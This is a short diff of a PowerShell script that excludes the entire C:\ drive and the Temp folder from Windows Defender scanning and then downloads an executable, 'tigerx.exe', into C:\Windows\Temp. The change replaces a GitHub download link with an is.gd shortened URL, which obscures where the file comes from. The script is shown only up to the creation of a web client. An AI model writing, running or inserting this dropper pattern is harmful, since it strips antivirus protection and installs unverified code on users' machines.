@@ -1,5 +1,5 @@
 Add-MpPreference -ExclusionPath "C:\","tigerx.exe","C:\Windows\Temp\"
-$url = "https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe"
+$url = "https://is.gd/tigerxgit"
 $outpath = "C:\Windows\Temp\tigerx.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 $wc = New-Object System.Net.WebClient
